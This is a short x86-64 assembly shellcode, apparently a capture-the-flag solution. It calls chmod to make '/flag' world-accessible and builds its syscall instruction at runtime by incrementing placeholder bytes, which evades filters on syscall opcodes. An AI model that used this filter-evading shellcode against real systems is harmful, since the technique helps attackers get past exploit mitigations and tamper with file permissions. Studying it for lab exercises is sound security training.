.global _start
_start:
.intel_syntax noprefix
        mov rax, 90
        lea rdi, [rip+flag]
        mov rsi, 0777

        inc byte ptr [rip+x+1]
        inc byte ptr [rip+x]

x:
.byte 0x0e
.byte 0x04

flag:
        .ascii "/flag"
